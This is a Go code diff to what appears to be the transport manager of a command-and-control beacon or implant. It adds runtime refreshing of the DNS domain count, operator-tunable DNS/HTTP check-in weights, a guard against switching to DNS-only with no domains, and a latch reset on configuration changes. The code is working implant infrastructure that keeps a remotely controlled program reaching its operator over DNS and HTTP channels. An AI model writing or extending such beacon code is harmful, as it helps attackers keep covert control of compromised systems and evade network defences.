@@ -201,6 +201,19 @@ func (m *transportManager) Latched() bool {
 	return m.latched
 }
 
+// RefreshDomains updates how many DNS domains the selector may choose from
+// after a runtime domain update. Without it the count captured at build time
+// goes stale, and a beacon that started with no domains can never select DNS
+// even after domains are added.
+func (m *transportManager) RefreshDomains(count int) {
+	if count < 0 {
+		count = 0
+	}
+	m.mu.Lock()
+	m.dnsEndpoints = count
+	m.mu.Unlock()
+}
+
 // SelectEndpoint chooses the single endpoint the next check-in is sent to, in
 // dual mode, over the DNS domains and HTTP listeners together. The transport
 // class is chosen by the configured weights (default 2:1 DNS:HTTP) and a
@@ -369,6 +382,10 @@ type transportUpdate struct {
 	Listeners             []HTTPListener `json:"listeners"`
 	FallbackAfterFailures int            `json:"fallback_after_failures"`
 	RetryBackoffSecs      int            `json:"retry_backoff_secs"`
+	// Optional runtime retuning of the dual check-in split. A nil pointer means
+	// "keep the build-time value"; an explicit 0 disables that class.
+	DNSWeight  *int `json:"dns_weight"`
+	HTTPWeight *int `json:"http_weight"`
 }
 
 // ApplyUpdate replaces the transport configuration at runtime.
@@ -396,7 +413,14 @@ func (m *transportManager) ApplyUpdate(payload string) error {
 
 	m.mu.RLock()
 	key := append([]byte(nil), m.c2Key...)
+	dnsEndpoints := m.dnsEndpoints
 	m.mu.RUnlock()
+
+	// A DNS-only switch with no configured domains would leave the beacon with
+	// nothing it can reach. Reject it and keep the working configuration.
+	if mode == transportDNS && dnsEndpoints == 0 {
+		return fmt.Errorf("transport mode %q needs at least one DNS domain", mode)
+	}
 
 	var transports []*httpTransport
 	for _, listener := range update.Listeners {
@@ -422,9 +446,25 @@ func (m *transportManager) ApplyUpdate(payload string) error {
 	if update.RetryBackoffSecs > 0 {
 		m.backoff = time.Duration(update.RetryBackoffSecs) * time.Second
 	}
+	if update.DNSWeight != nil {
+		w := *update.DNSWeight
+		if w < 0 {
+			w = 0
+		}
+		m.dnsWeight = w
+	}
+	if update.HTTPWeight != nil {
+		w := *update.HTTPWeight
+		if w < 0 {
+			w = 0
+		}
+		m.httpWeight = w
+	}
 
 	// A configuration change is a clean slate: the new endpoints deserve a
-	// chance even if the old ones were failing.
+	// chance even if the old ones were failing, and an operator re-enabling a
+	// transport clears any earlier latch.
+	m.latched = false
 	m.failures = 0
 	m.probing = false
 	m.lastErr = nil
